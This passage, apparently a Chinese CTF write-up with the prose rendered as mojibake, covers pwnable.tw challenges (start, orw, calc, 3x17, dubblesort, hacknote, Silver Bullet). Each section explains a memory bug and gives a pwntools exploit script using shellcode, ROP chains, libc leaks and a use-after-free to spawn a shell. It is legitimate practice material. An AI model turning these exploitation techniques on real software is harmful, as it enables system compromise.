retn`ï¼Œé€šè¿‡è¯»å…¥æ•°æ®å¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œå¹¶è¿”å›`.text:08048087  mov  ecx, esp `ï¼Œè¿™æ—¶æ‰§è¡Œsys_writeï¼Œå³å¯æ‰“å°å‡ºespçš„åœ°å€ï¼Œç„¶åç»§ç»­å†™å…¥shellcodeè¦†ç›–è¿”å›åœ°å€ï¼Œé‚£ä¹ˆç¨‹åºå°±å¯ä»¥æ‰§è¡Œä½ çš„shellcode\n\næ³¨æ„ï¼šshellcodeå¯ä»¥æŸ¥x86ç³»ç»Ÿè°ƒç”¨è¡¨æ¥è°ƒç”¨execve('/bin/sh',0,0)\n\n### exp\n\n```python\nfrom pwn import *\n#context.log_level = \"debug\"\np = process('./start')\n\npayload = 'A'*0x14 + p32(0x8048087)#leak esp after +0x18\np.sendafter(\"Let's start the CTF:\",payload)\nesp = u32(p.recv(4))\nprint 'esp: '+hex(esp)\n#gdb.attach(p)\nshellcode='\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80'\n#shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov al,0xb;int 0x80')\n#execve('/bin/sh',null,null)\npayload = 'A'*0x14 + p32(esp+0x14) + shellcode #Jump to shellcode\np.send(payload)\np.interactive()\n```\n\n## 0x02 orw\n\nç»å…¸ä¹‹ç»å…¸ï¼Œshellcodeå¿…åˆ·é¢˜\n\n32ä½ç¨‹åºï¼Œå¼€äº†æ²™ç›’\n\n```c\nunsigned int orw_seccomp()\n{\n  __int16 v1; // [esp+4h] [ebp-84h]\n  char *v2; // [esp+8h] [ebp-80h]\n  char v3; // [esp+Ch] [ebp-7Ch]\n  unsigned int v4; // [esp+6Ch] [ebp-1Ch]\n\n  v4 = __readgsdword(0x14u);\n  qmemcpy(&v3, &unk_8048640, 0x60u);\n  v1 = 12;\n  v2 = &v3;\n  prctl(38, 1, 0, 0, 0);\n  prctl(22, 2, &v1);\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\nç¦ç”¨äº†execve()ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨onegadget\nä½†æ˜¯ç¨‹åºå¼€äº†open()ï¼Œread()ï¼Œwrite()\n\nç¨‹åºå¾ˆç®€å•ï¼Œåœ¨bssæ®µè¾“å…¥shellcodeå¹¶æ‰§è¡Œï¼Œé‚£ä¹ˆæ–¹æ³•å°±æ˜¯åˆ©ç”¨orw\n\n### exp\n\n```python\nfrom pwn  import *\ncontext(log_level = 'debug', arch = 'i386', os = 'linux')\nsh=remote('chall.pwnable.tw',10001)\n#shellcode=asm(shellcraft.sh()) \n# I don't wanna be a tool boy\nshellcode=\"\"\nshellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; push 0x2f77726f; push 0x2f656d6f; push 0x682f2f2f; mov ebx,esp;xor edx,edx;int 0x80;')\n#open(file,0,0)\nshellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')\n#read(3,file,0x30)\nshellcode += asm('mov eax,0x4;mov bl,0x1;int 0x80;')\n#write(1,file,0x30)\nrecv = sh.recvuntil(':')\nsh.sendline(shellcode)\nflag = sh.recv(100)\nprint flag\n```\n\n## 0x03 calc\n\nä¸€é“å€¼å¾—æ·±ç©¶çš„é¢˜ç›®ï¼Œèƒ½å†™çš„çŸ¥è¯†ç‚¹å¤ªå¤šï¼Œæˆ‘æ‹©è¦ç‚¹å†™ä¸€ä¸‹\nä¸€ä¸ªè®¡ç®—å™¨ç¨‹åºï¼Œä»£ç é€»è¾‘å¾ˆç¹çï¼Œè€ƒå¯Ÿå¾ˆå¼ºçš„é€†å‘åŠŸåº•ï¼Œéœ€è¦é™ä¸‹å¿ƒæ¥æ…¢æ…¢åˆ†æ\nä¸»è¦é€»è¾‘åœ¨äºè§£æè¡¨è¾¾å¼çš„ä»£ç ï¼Œè´´ä¸Šæ³¨é‡Šè¿‡çš„ä»£ç \n\n```c\nsigned int __cdecl parse_expr(int buf, _DWORD *list)\n{\n  int len; // ST2C_4\n  int count; // eax\n  int buf_start; // [esp+20h] [ebp-88h]\n  int i; // [esp+24h] [ebp-84h]\n  int v7; // [esp+28h] [ebp-80h]\n  char *ptr; // [esp+30h] [ebp-78h]\n  int v9; // [esp+34h] [ebp-74h]\n  char op[100]; // [esp+38h] [ebp-70h]\n  unsigned int v11; // [esp+9Ch] [ebp-Ch]\n\n  v11 = __readgsdword(0x14u);\n  buf_start = buf;\n  v7 = 0;\n  bzero(op, 0x64u);\n  for ( i = 0; ; ++i )\n  {\n    if ( (*(i + buf) - 48) > 9 )                // ä¿å­˜æ“ä½œç¬¦ä¹‹å‰çš„æ•°å­—\n    {\n      len = i + buf - buf_start;\n      ptr = malloc(len + 1);\n      memcpy(ptr, buf_start, len);\n      ptr[len] = 0;\n      if ( !strcmp(ptr, \"0\") )\n      {\n        puts(\"prevent division by zero\");\n        fflush(stdout);\n        return 0;\n      }\n      v9 = atoi(ptr);\n      if ( v9 > 0 )\n      {\n        count = (*list)++;                      // list[0]å­˜æ”¾æ•°å­—ä¸ªæ•°\n        list[count + 1] = v9;\n      }\n      if ( *(i + buf) && (*(i + 1 + buf) - 48) > 9 )// ä¸å…è®¸è¿ç»­æœ‰ä¸¤ä¸ªè¿ç®—ç¬¦\n      {\n        puts(\"expression error!\");\n        fflush(stdout);\n        return 0;\n      }\n      buf_start = i + 1 + buf;\n      if ( op[v7] )                             // å¦‚æœæœ‰å‰åºè¿ç®—ç¬¦ï¼Œè¿›è¡Œè¿ç®—ç¬¦æ¯”è¾ƒï¼Œç„¶åè®¡ç®—\n      {\n        switch ( *(i + buf) )                  //ä¼˜å…ˆçº§æ“ä½œ\n        {\n          case '%':\n          case '*':\n          case '/':\n            if ( op[v7] != '+' && op[v7] != '-' )\n            {\n              eval(list, op[v7]);\n              op[v7] = *(i + buf);\n            }\n            else\n            {\n              op[++v7] = *(i + buf);\n            }\n            break;\n          case '+':\n          case '-':\n            eval(list, op[v7]);\n            op[v7] = *(i + buf);\n            break;\n          default:\n            eval(list, op[v7--]);\n            break;\n        }\n      }\n      else\n      {\n        op[v7] = *(i + buf);                    // å¦‚æœæ²¡æœ‰å‰åºè¿ç®—ç¬¦ï¼ŒæŠŠå½“å‰è¿ç®—ç¬¦æ”¾å…¥opæ•°ç»„ä¸­\n      }\n      if ( !*(i + buf) )                        // ç©ºå­—ç¬¦ç»“æŸ\n        break;\n    }\n  }\n  while ( v7 >= 0 )\n    eval(list, op[v7--]);\n  return 1;\n}\n```\n\næœ€åçš„è¿ç®—æ˜¯eval()ï¼Œå…·ä½“æ“ä½œè§ä»£ç \n\n```c\n_DWORD *__cdecl eval(_DWORD *list, char op)\n{\n  _DWORD *result; // eax\n\n  if ( op == '+' )\n  {\n    list[*list - 1] += list[*list];\n  }\n  else if ( op > '+' )\n  {\n    if ( op == '-' )\n    {\n      list[*list - 1] -= list[*list];\n    }\n    else if ( op == '/' )\n    {\n      list[*list - 1] /= list[*list];\n    }\n  }\n  else if ( op == '*' )\n  {\n    list[*list - 1] *= list[*list];\n  }\n  result = list;\n  --*list;\n  return result;\n}\n```\n\nå…¶ä¸­*listå­˜æ”¾æ•°å­—çš„ä¸ªæ•°ï¼Œåœ¨evalä¸­ä½œä¸ºç´¢å¼•è¿›è¡Œè¿ç®—\n\nå…¶å®ç¨‹åºè¶Šå¤æ‚ï¼Œè¶Šéš¾æ‰¾åˆ°æ¼æ´\n\nç¨‹åºçœ‹èµ·æ¥å¾ˆè‡ªç„¶ï¼Œå¹¶æ²¡ä»€ä¹ˆå±é™©çš„æ“ä½œï¼Œå½“æˆ‘ä»¬è¾“å…¥1+2æ—¶ï¼Œç»“æ„æ˜¯è¿™æ ·çš„\n\n```c\nlist[2] = {2,1,2}\nop[0] = {\"+\"}\n```\n\næ‰§è¡Œlist[\\*list - 1] += list[\\*list]æ—¶ ==> list[1] = list[1] + list[2] = 3\n\næ­¤æ—¶list[2] = {2,3,2}; æ­¤æ—¶pirntfå°±æ˜¯list[1] \n\nä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åªè¾“å…¥+1ï¼Œlist[1] = {1,1}ï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆè¿™æ ·list[\\*list - 1] += list[\\*list] ==> list[0] = list[1] + list[0] = 1+1 =2ï¼›æ­¤æ—¶printfçš„ç»“æœå°±æ˜¯list[0]ï¼Œ(list[0]éœ€è¦è‡ªå‡1)\n\nç”±äºç¼ºå°‘ç›¸å…³æ£€æŸ¥ï¼Œæ‰€ä»¥ä¼šå­˜åœ¨è¿™ç§ç»“æœ,å¦‚æœ+xæ—¶ï¼Œå°±ä¼šè¾“å‡ºlist[x-1]ï¼Œå½“xè¶…å‡ºresulté•¿åº¦æ—¶å³å¯è¯»å–åˆ°æ ˆä¸Šå…¶ä»–çš„æ•°æ®\n\næµ‹è¯•å¦‚ä¸‹ï¼Œæ•°ç»„è¶Šç•Œè¯»\n\n![](https://i.loli.net/2020/12/11/BVZ7r59JXxTgD1y.png)\n\n\n\nå†è€ƒè™‘å¦ä¸€ç§æƒ…å†µ+x+y  \n\nlist[0] = x+1\n\nlist[x+1] = y\n\nlist[\\*list - 1] += list[\\*list] ==> list[x] = list[x] + list[x+1] \n\n```c\nif ( v9 > 0 )\n{\n    count = (*list)++;                      // list[0]å­˜æ”¾æ•°å­—ä¸ªæ•°\n    list[count + 1] = v9;\n}\n```\næ‰€ä»¥è¯´é€šè¿‡è¿™ç§æ“ä½œå¯ä»¥è¿›è¡Œæ•°ç»„è¶Šç•Œå†™\n\nä¾‹å¦‚ï¼š+361+1 ==> list[362] = 1;\n\n![](https://image.3001.net/images/20170418/14925270013675.png)\n\nåŸç†å›¾å¦‚ä¸Šï¼Œç³»ç»Ÿè°ƒç”¨execveå‡½æ•°æ¥getshell\n\n### exp\n\n```python\nfrom pwn import *\ncontext(os='linux',arch='i386',log_level='debug')\nio = remote(\"chall.pwnable.tw\",10100)\n\n# /bin/sh and gadget\nstr_bin = 0x6e69622f\nstr_sh = 0x0068732f\npop_eax = 0x0805c34b\npop_edx_ecx_ebx = 0x080701d0\nint_80 = 0x08049a21\n\n# leak ebp\nio.recv()\nio.sendline(\"+360\")\nebp = int(io.recv())-0x20\nbinsh_addr = ebp+8*4\n\n# attack\nROP = [pop_eax,11,pop_edx_ecx_ebx,0,0,binsh_addr,int_80,str_bin,str_sh]\nfor i in range(361,370):\n\tnum = i - 361\n\tio.sendline(\"+\"+str(i))\n\ttmp = int(io.recvline())\n\tif tmp<ROP[num]:\n\t\tio.sendline(\"+\"+str(i)+\"+\"+str(ROP[num]-tmp))\n\telse:\n\t\tio.sendline(\"+\"+str(i)+\"-\"+str(tmp-ROP[num]))\n\tio.recvline()\n\nio.sendline()\nio.interactive()\n\n```\n\n## 0x04 3x17\n\né™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶ä¸”æ˜¯å»é™¤ç¬¦å·è¡¨ï¼Œä½¿å¾—ç¨‹åºå¯è¯»æ€§å¤§å¤§é™ä½ï¼Œçœ‹ä¸€ä¸‹ä¸»å‡½æ•°\n\nå‘ç°ç¨‹åºæœ‰å¾ˆå¤šç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥å…¶å®çœ‹æ±‡ç¼–ä¼šæ›´æœ‰åŠ©äºç†è§£ï¼Œç”±äºç¯‡å¹…é—®é¢˜å°±ä¸æ”¾æ±‡ç¼–ä»£ç äº†\n\n```c\n__int64 __fastcall sub_401B6D(__int64 a1, char *a2, __int64 a3)\n{\n  __int64 result; // rax\n  int v4; // eax\n  char *v5; // ST08_8\n  char buf; // [rsp+10h] [rbp-20h]\n  unsigned __int64 v7; // [rsp+28h] [rbp-8h]\n\n  v7 = __readfsqword(0x28u);         //canary\n  result = (unsigned __int8)++byte_4B9330;\n  if ( byte_4B9330 == 1 )            //è¾“å…¥æ¡ä»¶åˆ¤æ–­\n  {\n    sub_446EC0(1u, \"addr:\", 5uLL);   //sys_write_addr\n    sub_446E20(0, &buf, 0x18uLL);    //sys_read\n    sub_40EE70((__int64)&buf);       //å°†è¾“å…¥çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹åº”çš„16è¿›åˆ¶\n    v5 = (char *)v4;\n    sub_446EC0(1u, \"data:\", 5uLL);   //sys_write_addr\n    sub_446E20(0, v5, 0x18uLL);      //sys_read\n    result = 0LL;\n  }\n  if ( __readfsqword(0x28u) != v7 )\n    sub_44A3E0();\n  return result;\n}\n```\n\nå…¶ä¸­`sub_40EE70`å‡½æ•°å¾ˆå¤æ‚ï¼Œæ²¡è¯»æ‡‚ï¼Œä½†æ˜¯é€šè¿‡åŠ¨è°ƒè¿˜æ˜¯èƒ½å¤Ÿå‘ç°å®ƒçš„åŠŸèƒ½ã€‚\n\nå‡½æ•°ä¹‹å‰ï¼š\n\n![image-20201124163242159](https://i.loli.net/2020/11/24/zhKsp5XuP2I3Q1Z.png)\n\nè¿è¡Œè¿‡åï¼š\n\n![image-20201124163309940](https://i.loli.net/2020/11/24/rSitcBuT1fgQpLn.png)\n\næ³¨æ„raxå¯„å­˜å™¨çš„å˜åŒ–ï¼Œå¾ˆå®¹æ˜“å‘ç°å®ƒæ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–æˆæ•´å½¢å˜ä¸º16è¿›åˆ¶æ•°\n\n```python\nPython 2.7.12 (default, Oct  5 2020, 13:56:01) \n[GCC 5.4.0 20160609] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> print hex(123123)\n0x1e0f3\n>>> \n```\n\næ‰€ä»¥ç¨‹åºé€»è¾‘å¾ˆæ¸…æ¥šäº†ï¼Œå°±æ˜¯å‘ä½ è¾“å…¥çš„åœ°å€å¤„è¿›è¡Œå†™æ“ä½œã€‚ç›®æ ‡å°±æ˜¯é€šè¿‡åœ°å€ä»»æ„å†™æ¼æ´æ¥getshllã€‚\n\næˆ‘ä»¬éƒ½çŸ¥é“__libc_start_mainå‡½æ•°\n\n> **\\_\\_libc_start_main( main, argc, argv, \\__libc_csu_init, __libc_csu_fini, edx, top of stack)**\n>\n> init: mainè°ƒç”¨å‰çš„åˆå§‹åŒ–å·¥ä½œ\n> fini: mainç»“æŸåçš„æ”¶å°¾å·¥ä½œ\n> rtld_fini: å’ŒåŠ¨æ€åŠ è½½æœ‰å…³çš„æ”¶å°¾å·¥ä½œ\n\nç¨‹åºåªèƒ½å†™ä¸€æ¬¡åœ°å€ï¼Œåˆç”±äºæ˜¯é™æ€ç¼–è¯‘ï¼Œå¯ç”¨å‡½æ•°å¾ˆå°‘ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¿›è¡Œæ¡ä»¶ç»•è¿‡\n\nè¿™é¢˜__libc_csu_finiä¸­æœ‰ä¸¤ä¸ª.fini_arrayï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”¹.fini_array[1]ä¸º mainå‡½æ•°ï¼Œ.fini_array[0]æ”¹ä¸º\\_\\_libc_csu_finiï¼Œè¿™æ ·å°±ä¼šæ— é™è¿è¡Œmainå‡½æ•°ï¼Œå°±åƒè¿™ç§ç»“æ„ï¼š\n\n```c\nmain -->  __libc_csu_fini --> fini_array[1] --> fini_array[0]\n```\n\nå½“++byte_4B9330ä¸æ–­å¢å¤§åˆ°ä¸€å®šå€¼åä¼šå‘ç”Ÿæº¢å‡ºå†æ¬¡å˜ä¸º1ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥å®ç°æ— é™å†™åœ°å€ã€‚\n\nè¿™æ˜¯startç¨‹åºå…¥å£ï¼Œä¸‹é¢ä½œäº†æ³¨é‡Šï¼Œè¦æ³¨æ„64ä½ç¨‹åºä¼ å‚\n\n```c\n start           proc near \n ; __unwind {\n                 xor     ebp, ebp\n                 mov     r9, rdx\n                 pop     rsi\n                 mov     rdx, rsp\n                 and     rsp, 0FFFFFFFFFFFFFFF0h\n                 push    rax\n                 push    rsp\n                 mov     r8, offset sub_402960   //__libc_csu_fini\n                 mov     rcx, offset loc_4028D0  //__libc_csu_init\n                 mov     rdi, offset sub_401B6D  //main\n                 db      67h\n                 call    sub_401EB0              //__libc_start_main\n                 hlt\n } // starts at 401A50\n```\n\nå­¦ä¹ å‚è€ƒæºç [glibc/csu/elf-init.c](https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/csu/elf-init.c)ï¼Œ\n\nIDAé‡Œçš„__libc_csu_finiå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°`call qword ptr [rbp+rbx*8+0]`å°±æ˜¯è°ƒç”¨fini_arrayå‡½æ•°ï¼Œ\n\n![image-20201124174758392](https://i.loli.net/2020/11/24/YVSvmNZ8WwgnJlb.png)\n\nå½“æˆ‘ä»¬åœ¨callä¹‹åå¦‚æœèƒ½æ‰§è¡Œleave_retï¼Œé‚£ä¹ˆä¹‹ååœ¨é”€æ¯æ ˆå¸§çš„è¿‡ç¨‹ä¸­ï¼Œrspä¼šè¢«å˜åˆ°0x4b100ï¼Œå³retåå°±å¯ä»¥åŠ«æŒipå¯„å­˜å™¨åˆ°è¿™ï¼Œé‚£ä¹ˆå°±å¯ä»¥åœ¨è¿™é‡Œæ„é€ ropï¼Œä»è€Œgetshellã€‚\n\n### exp\n\n```python\nfrom pwn import *\nelf = ELF('./3x17')\n#io = remote(\"chall.pwnable.tw\",10105)\nio = elf.process()\n\nsyscall = 0x471db5 #syscall\npop_rax = 0x41e4af\npop_rdx = 0x446e35\npop_rsi = 0x406c30\npop_rdi = 0x401696\nbin_sh = 0x4B41a0\nfini_array = 0x4B40F0\nmain_addr = 0x401B6D\nlibc_csu_fini = 0x402960\nleave_ret = 0x401C4B\n\nesp = 0x4B4100\n\ndef write_addr(addr,data):\n\tio.recv()\n\tio.send(str(addr))\n\tio.recv()\n\tio.send(data)\n\nwrite_addr(fini_array,p64(libc_csu_fini) + p64(main_addr)) # 0 , 1\n#execve('/bin/sh',0,0)\nwrite_addr(bin_sh,\"/bin/sh\\x00\")\nwrite_addr(esp,p64(pop_rax))\nwrite_addr(esp+8,p64(0x3b))\nwrite_addr(esp+16,p64(pop_rdi))\nwrite_addr(esp+24,p64(bin_sh))\nwrite_addr(esp+32,p64(pop_rdx))\nwrite_addr(esp+40,p64(0))\nwrite_addr(esp+48,p64(pop_rsi))\nwrite_addr(esp+56,p64(0))\nwrite_addr(esp+64,p64(syscall))\nwrite_addr(fini_array,p64(leave_ret))\n\nio.interactive()\n```\n\n## 0x05 dubblesort\n\n32ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å¼€\n\næœ¬é¢˜çš„è€ƒç‚¹å¾ˆæ–°å¥‡ï¼Œå€¼å¾—å¥½å¥½ç ”ç©¶ä¸€ä¸‹\n\nè¿™æ˜¯å†’æ³¡æ’åºçš„é€»è¾‘ï¼Œæ¯æ¬¡å¾ªç¯å°†æœ€å¤§å€¼æ”¾åœ¨æ•°ç»„çš„æœ€åï¼Œç„¶åæŒ‰åºè¾“å‡º\n\nä½†æ˜¯ç”±äºarryæ•°ç»„å¹¶æ²¡æœ‰æ£€æŸ¥è¾¹ç•Œï¼Œæ‰€ä»¥å¯ä»¥æ„é€ è¶³å¤Ÿå¤šçš„æ•°ï¼Œé€ æˆæ ˆæº¢å‡º\n\n```c\nunsigned int __cdecl dubblesort(unsigned int *arry, int len)\n{\n  unsigned int v2; // edx\n  int v3; // ecx\n  unsigned int *i; // edi\n  unsigned int v5; // esi\n  unsigned int *v6; // eax\n  unsigned int result; // eax\n  unsigned int v8; // et1\n  unsigned int v9; // [esp+1Ch] [ebp-20h]\n\n  v9 = __readgsdword(0x14u);\n  puts(\"Processing......\");\n  sleep(1u);\n  if ( len != 1 )\n  {\n    v3 = len - 2;\n    for ( i = &arry[len - 1]; ; --i )\n    {\n      if ( v3 != -1 )\n      {\n        v6 = arry;\n        do\n        {\n          v2 = *v6;\n          v5 = v6[1];\n          if ( *v6 > v5 )\n          {\n            *v6 = v5;\n            v6[1] = v2;\n          }\n          ++v6;\n        }\n        while ( i != v6 );\n        if ( !v3 )\n          break;\n      }\n      --v3;\n    }\n  }\n  v8 = __readgsdword(0x14u); //canary\n  result = v8 ^ v9;\n  if ( v8 != v9 )\n    sub_BA0(v3, v2);\n  return result;\n}\n```\n\næ¼æ´ç‚¹åœ¨readæ—¶æœ«å°¾æœªæ·»åŠ \\x00æˆªæ–­ï¼Œå¯¼è‡´printfå¯ä»¥æ³„éœ²å‡ºlibcåŸºå€\n\n```c\ninit();\n  __printf_chk(1, (int)\"What your name :\");\n  read(0, &name, 0x40u);\n  __printf_chk(1, (int)\"Hello %s,How many numbers do you what to sort :\");\n  __isoc99_scanf((int)\"%u\", (int)&count);\n```\n\nä¹‹åçš„scanfå¤„å°±å¯ä»¥è¿›è¡Œæ ˆæº¢å‡ºäº†\n\nè€Œæœ¬é¢˜éš¾ç‚¹åœ¨äºå¦‚ä½•ç»•è¿‡canaryï¼Œç”±äºæ•°ç»„è¶Šç•Œï¼Œæ ¹æ®ä½ çš„è¾“å…¥ï¼Œåœ¨æ’åºä¹‹åcanaryä¹Ÿä¼šå‘ç”Ÿç›¸åº”æ”¹å˜ï¼Œä¸ºäº†ä¿è¯canaryçš„å€¼å’Œä½ç½®ä¸å‘ç”Ÿå˜åŒ–ï¼Œå¿…é¡»è¦ä¿è¯æˆ‘ä»¬çš„è¾“å…¥æœ‰æ•ˆä¸”åˆæ³•ï¼Œ\n\nscanfå‡½æ•°æ¥æ”¶çš„æ•°æ®æ ¼å¼ä¸ºæ— ç¬¦å·æ•´å‹ï¼ˆ%uï¼‰ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆå­—ç¬¦å¯ä»¥æ—¢è®©scanfè®¤ä¸ºå®ƒæ˜¯åˆæ³•å­—ç¬¦ï¼ŒåŒæ—¶åˆä¸ä¼šä¿®æ”¹æ ˆä¸Šçš„æ•°æ®å‘¢ï¼ŸæŸ¥é˜…èµ„æ–™åï¼Œå‘ç°â€œ+â€å’Œâ€œ-â€å¯ä»¥è¾¾åˆ°æ­¤ç›®çš„ï¼Œæ‰€ä»¥åœ¨canaryå¤„è¾“å…¥â€œ+â€æˆ–â€œ-â€å³å¯ç»•è¿‡\n\n\\# å¦‚æœä¸çŸ¥é“æ— ç¬¦å·æ•´å‹åœ¨å†…å­˜ä¸­çš„å­˜å‚¨å½¢å¼ï¼Œå¯ä»¥è‡ªå·±å†™æ®µä»£ç è°ƒè¯•ä¸€ä¸‹\n\n```c\n#include <stdio.h>\nint main()\n{\n    int s[10];\n    for(int i =0;i<10;i++){\n        scanf(\"%u\",&s[i]);\n        printf(\"%u\\n\",s[i]);\n    }\n    return 0;\n}\n```\n\né‚£ä¹ˆæ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œå…¶ä½™çš„å·¥ä½œå°±æ˜¯æ‰¾åç§»äº†ï¼Œé€šè¿‡gdbåŠ¨è°ƒå³å¯è§£å†³\n\n### exp\n\n```python\nfrom pwn import *\n# p = remote('chall.pwnable.tw',10101)\n# p = process('./dubblesort')\np = process(\"./dubblesort\")\n# libc = ELF('./libc_32.so.6')\nlibc = ELF('/lib/i386-linux-gnu/libc.so.6')\n\npayload = \"a\"*24\np.recvuntil(\":\")\np.sendline(payload)\nlibc_addr = u32(p.recv()[30:34])-0xa\nlibcbase_addr = libc_addr - 0x1b0000     #remote\n# libcbase_addr = libc_addr - 0x1b3000   #local\n# gdb.attach(p)\nsys = libcbase_addr + libc.symbols['system']\nbinsh = libcbase_addr + libc.search('/bin/sh').next()\np.sendline('35')\np.recv()\nfor i in range(24):\n    p.sendline(str(i))\n    p.recv()\np.sendline('+')\np.recv()\nfor i in range(9):\n    p.sendline(str(sys))\n    p.recv()\np.sendline(str(binsh))\np.recv()\np.interactive()\n```\n\n\n\n## 0x06 hacknote\n\n32ä½å †ï¼Œæ¼æ´ç‚¹åœ¨äºdeleteå‡½æ•°å­˜åœ¨uaf\n\n```c\n  if ( ptr[v1] )\n  {\n    free(*(ptr[v1] + 1));\n    free(ptr[v1]);\n    puts(\"Success\");\n  }\n```\n\nè€Œptr[0]å­˜æ”¾å‡½æ•°æŒ‡é’ˆ(puts)ï¼Œæ‰€ä»¥æ€è·¯æ˜¯åˆ©ç”¨uafå°†putsçš„æŒ‡é’ˆæ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€\n\néš¾ç‚¹åœ¨äºæœ¬åœ°å’Œé¶æœºçš„libcç‰ˆæœ¬å­˜åœ¨å·®å¼‚ï¼Œéœ€è¦åŠ¨è°ƒæ¥æ‰¾åç§»\n\nå†™ä¸¤ç§åˆ©ç”¨æ–¹æ³•\n\n### exp1\n\né€šè¿‡unsortedbinæ¥æ³„éœ²main_arenaï¼Œä»è€Œæ³„éœ²å‡ºlibcåŸºå€\n\nç„¶åé€šè¿‡ç”³è¯·0x8å¤§å°çš„å †å—æ¥ä¿®æ”¹ptræŒ‡é’ˆï¼Œç„¶è€Œé€šè¿‡æµ‹è¯•onegadgetæ‰“ä¸é€šï¼Œæ‰€ä»¥æ”¹ä¸ºsystem\n\nç”±äºé™åˆ¶å››ä¸ªå­—èŠ‚ï¼Œä¸”éœ€è¦ä¸»è¦systemå‚æ•°æˆªæ–­ï¼Œæ‰€ä»¥å¯é€‰æ‹©`||`ï¼Œ`;` + `sh`ï¼Œ`$0`éƒ½å¯ä»¥\n\n```python\nfrom pwn import *\n# context.log_level='debug'\nelf=ELF(\"./hacknote\")\nlibc = ELF('libc-2.23.so')\n# libc = ELF('/lib/i386-linux-gnu/libc.so.6')\n# r = elf.process()\nr = remote('chall.pwnable.tw',10102)\n# onegadget = [0x3ac6c,0x3ac6e,0x3ac72,0x3ac79,0x5fbd5,0x5fbd6]\nonegadget = [0x3a819,0x5f065,0x5f066]\ndef add(size,content):\n\tr.recvuntil(\"Your choice :\")\n\tr.sendline('1')\n\tr.recvuntil(\"Note size :\")\n\tr.sendline(str(size))\n\tr.recvuntil(\"Content :\")\n\tr.send(content)\n\ndef delete(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('2')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\ndef show(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('3')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\nadd(0x18,'aaa')\nadd(0x90,'ccc')\nadd(0x18,'ddd')\ndelete(1)\nadd(0x90,'aaaa')\nshow(1)\n\nr.recvuntil('a'*4)\nlibc_base = u32(r.recvline().strip('\\n')) - 0x1b07b0\n# print hex(48 + 0x18 + libc.sym['__malloc_hook'])\ninfo(hex(libc_base))\n# gdb.attach(r)\n# print hex(libc.sym['__malloc_hook'])\nrce = libc_base + onegadget[1]\nsys = libc_base + libc.sym['system']\ndelete(0)\ndelete(1)\nadd(8,p32(sys)+\";sh\\x00\")\n# add(8,p32(rce))\nshow(0)\nr.interactive()\n```\n\n### exp2\n\næ€è·¯æ˜¯å°†ptræ”¹ä¸ºprintfæ‰“å°å‡ºputs_gotï¼Œä¹‹ååŒæ ·çš„æ–¹æ³•æ”¹ä¸ºsystemå³å¯\n\n```python\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\nfrom pwn import *\n# p = remote('chall.pwnable.tw',10102)\np = process('./hacknote')\n\nlibc_elf = ELF('/lib/i386-linux-gnu/libc.so.6')\n\ndef add_note(size,content):\n    p.recvuntil('Your choice :')\n    p.sendline('1')\n    p.recvuntil('Note size :')\n    p.sendline(str(size))\n    p.recvuntil('Content :')\n    p.sendline(content)\n\ndef free_note(index):\n    p.recvuntil('Your choice :')\n    p.sendline('2')\n    p.recvuntil('Index :')\n    p.sendline(str(index))\n\ndef print_note(index):\n    p.recvuntil('Your choice :')\n    p.sendline('3')\n    p.recvuntil('Index :')\n    p.sendline(str(index))\n\nlibc_puts_addr = libc_elf.symbols['puts']\nlibc_sys_addr = libc_elf.symbols['system']\nputs_got_addr = 0x0804A024\nprint_content = 0x0804862B\n\nadd_note(32,\"a\"*32)\nadd_note(32,\"b\"*32)\nfree_note(0)\nfree_note(1)\nadd_note(8,p32(print_content)+p32(puts_got_addr))\nprint_note(0)\nleak_puts_addr = u32(p.recv(4))\nprint leak_puts_addr\nlibcbase_addr = leak_puts_addr - libc_puts_addr\nsystem_addr = libcbase_addr + libc_sys_addr\n\nfree_note(2)\nadd_note(8,flat([system_addr,\"||sh\"]))\nprint_note(0)\np.interactive()\n\n```\n\n## 0x07 Silver Bullet\n\nå¾ˆæœ‰æ„æ€çš„é¢˜ç›®\n\n![image-20201215161015680](https://i.loli.net/2020/12/15/EyClmD9KjWbcprH.png)\n\nç±»ä¼¼ä¸€ä¸ªæ¸¸æˆï¼Œå¦‚æœä½ çš„è¾“å…¥é•¿åº¦å¤§äº0x7fffffffï¼Œå°±å¯ä»¥æ€æ­»ç‹¼äºº\n\nå…³é”®å‡½æ•°åœ¨äºpower upä¸­\n\n```c\nint __cdecl power_up(char *dest)\n{\n  char s; // [esp+0h] [ebp-34h]\n  size_t v3; // [esp+30h] [ebp-4h]\n\n  v3 = 0;\n  memset(&s, 0, 0x30u);\n  if ( !*dest )\n    return puts(\"You need create the bullet first !\");\n  if ( *((_DWORD *)dest + 12) > 0x2Fu )\n    return puts(\"You can't power up any more !\");\n  printf(\"Give me your another description of bullet 